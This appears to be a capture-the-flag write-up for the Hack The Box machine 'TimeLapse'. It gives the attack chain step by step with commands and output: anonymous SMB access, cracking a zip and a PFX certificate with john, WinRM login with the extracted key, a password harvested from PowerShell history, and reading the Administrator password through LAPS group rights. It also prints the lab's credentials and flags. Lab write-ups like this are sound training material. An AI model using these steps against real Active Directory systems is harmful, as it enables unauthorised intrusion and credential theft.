---
title: "TimeLapse from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# TimeLapse from HTB
`nmap`gave this:
```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-18 00:31:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```
Then go to `smb`its open on `445 port`
```bash
smbclient //10.10.11.152/shares
Password for [WORKGROUP\giorgi]:
Try "help" to get a list of possible commands.
smb: \> ls
  .
  ..
  Dev
  HelpDesk
```
Then download all files in that directory:
```bash
cd Dev\
get Dev\winrm_backup.zip
cd HelpDesk\
get LAPS.x64.msi
get LAPS_TechnicalSpecification.docx
get LAPS_OperationsGuide.docx
get LAPS_Datasheet.docx
```
Then we should crack that `.zip`file which needs password and we will use `john`
```bash
zip2john Devwinrm_backup.zip >> hash_Dev
john -w=/usr/share/wordlists/rockyou.txt hash_Dev
-------
supremelegacy    (Devwinrm_backup.zip/legacyy_dev_auth.pfx)
-------
unzip Devwinrm_backup.zip
```
This will give us `legacyy_dev_auth.pfx` Which stores certificates and keys. We should crack it too with `john`
```bash
pfx2john legacyy_dev_auth.pfx >> legacy_hash
john -w=/usr/share/wordlists/rockyou.txt legacy_hash
-------
thuglegacy       (legacyy_dev_auth.pfx)
-------
```
Then extract certificates like this. Enter password all times when it asks you to
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx


Verifying - Enter PEM pass phrase:
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQ2i/vfK4gBZ8MUojR
pEjXMwICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEJ6w6RVwQM/ipW/A
e//0LdIEggTQh/f5BKbRecUFOLCNdtQzS91q7QMzs3NjJWMcKfAu7DBQHWrYLN/Y
Zp1C24Ts0OQ/FwM1YtQRyNtSLu/30fS+0bI6T+yadanpAsTJ2aHiYrI4MP3rx/xx
yijA92IPcUWA8KveLNHdw3ZlMvJMq/hPh62jHUNzt8UuMzEuGHfNlwWiJC3Ry/Sb
dMewTsJ+OguwYw37CqQAjOErAgad8mk/LJyZxS0B9H5hivwh6z5dS77nMSInJ8uy
mlnjbv8BPZFYn4V4tveCO/7w4gigttXSHZscM1lvmu7zvm12KrCjcledOti6gDrL
bkJMDTOvXtH6IPvNXu1SX7N3wwmW7ah2ZIIjtXIidHAmFL1thyFN4c0xnH/PbqOX
OVS4JRr0iK2GZYiAzNfmx2mc8vhr3vuveRRcUhBbkU/cQ1Ubtp7EFYXhBvbTGATt
cThPFTVWFEhRE41Xvz+fXyIoQgmMHt9BzEF/YdIFOEJat7VEPM+OIN0gPhS6R531
d+XGM+/gw2XY8Z2fJ96ZDC/5eIOafrQLetdPlQil2LewtqqrmMv8RYE9hNqHYsBE
OGtZuG5FQ4Mwspf/81MmJDtiple0H9QOgYjV2rgPlsEt1uvCw/aBq0urqupBjQ/y
A9bNEza7d92ZDu0F41wLm5eI81ixSv7+n4eWONkTO3iuissRgR1rb06ak5/wVJmZ
oNC+u0gb+wC2+QWbGIofTzLegY8B2lnrLOFjASnNmwRqUJ5B8luO1YRhDBZFhsS2
9QBFRpWUIVSm7LmFwtL1zgkJTql0KXYdDrIkmLmYvPFfdqn+8T2KX03dQwQxsvVb
6bDm/mgXJeQc2rK5sEB4T/rzGFABLq52PBA+H8ZyNhPTJa2nk66kVeAqtik0cebc
KxdpMyrYh/XUB4x+Gy04SNXv/R6rYAHPaV1pZxgsTBWQeod5nGOi5tMMO8eU5nah
cTjbpFm3Rp0nieGlFCmUMvY4aMAA7s5nS8kKfKO7HIHK4BpQtzg/Cm7BWOfujpYS
zR6EQXAb0Dpa9jCT8C26j1ucXLjmWSpsuYeEgZrWGc+5w/aHdR6SAQ1GdsiSBs0v
7xD8+P9jCs0gQz1FhovB/ZTzKot35R1QnL+ij3zNGubqpr/nz3mMp3i7pAI9rGm3
bJSv4uzcHoBKRfY+OqyuAOmwXvT2SeStt7Le6ApaFmkaGLEpfGsyWWqG8HUbhxod
ohgrFvqIVpplLR5SnI1U1oty3d3EwUBPKtbqbPf5xBLm9AQ+nE1+spHZ21iofm/y
lPjnWNAXkGdjsMxgHW2KdEm28Q4AF4/4YINku0/LW3Zy2SkA3H2m/TJsAy3wUhaX
2pGutijsnPE8vHbYsFQK09oNbDNvPPO5Utyhg2k0OCPBcGOScKupmjxljmZVGrzy
1/m5+nidot73wCwBHzWvGwDcjkTpiTzacvMfX2QtCqTrwqAU97xxcb98WnZ26RgO
HeiiO0gYY28+SzypPi3BV3RDIh9ag+jVpvgh591xVY+cQYeGJRUEuawCy+JfrCGe
vI5T8xha/rWbz8VX4EM4QsIUd+QchaRyty7oROzMmG+cwGhlm7kb2HUAv7F0tgtQ
aBhe4YbSGHDO29DZSSIZ5K33K637OHy3n5OH1/tZJIJvtVOAS3nMiDw=
-----END ENCRYPTED PRIVATE KEY-----



-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----

```
We'll need this to connect to this machine with `evil-winrm`
`Ports of winrm are open if you tell nmap to list all open ports`
Then save this key and certificate like this:
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert
```
Then connect:
```
evil-winrm -S -i 10.10.11.152 -c key.cert -k key.pem
```
User flag is in `C:\Users\legacyy\Desktop>`
***
User Flag is: 9f1d2a28bbb23052353dbe901d498486
***
Now you need to find another `users`credentials
```
C:\Users\legacyy\APPDATA\Roaming\microsoft\windows\powershell\psreadline> cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
```
>Username ---- svc_deploy
>Password ---- E3R$Q62^12p7PLlC%KWaxuaV

exit the connection and then connect as `svc_deploy`
Then read things about you
```
net user svc_deploy
------------
------------
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
```
With `LAPS_Readers`you can read passwords of users.
Then with this command you can find password for `Administrator`
```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
------
---------
------------
ms-Mcs-AdmPwd                        : 7AP18$Q3+(.%58O9D-&4M}x#
------------
-------------------
---------
```
Exit the connection and connect as `administrator`
```
evil-winrm -S -i 10.10.11.152 -p '7AP18$Q3+(.%58O9D-&4M}x#' -u 'Administrator'
```
Root flag is in `C:\users\trx\desktop`
***
Root Flag is: 64372544d029b29754146e6cc55883c9
***
![](/assets/images/Screenshot from 2024-08-17 20-29-33.png)
F*ck* Windows <3
